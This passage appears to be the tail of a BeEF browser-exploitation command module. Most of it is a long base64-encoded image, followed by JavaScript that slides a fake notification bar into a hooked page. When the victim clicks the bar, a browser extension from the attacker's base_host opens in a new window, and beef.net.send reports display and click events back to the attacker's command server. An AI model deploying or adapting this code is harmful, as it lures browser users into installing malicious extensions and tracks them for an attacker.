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'>");
        $j(hid).append(elr);
        $j(hid).click(function() {
            $j(this).slideUp(300,function() {
                $j(this).remove();
            });
            //window.location.href = ff_extension;
            window.open(base_host+ff_extension);
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=User has clicked the notification');
        });
        $j(hid).css('cursor','pointer');
        $j(hid).slideDown(300,function() {
            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Notification has been displayed');
        });
    }
});
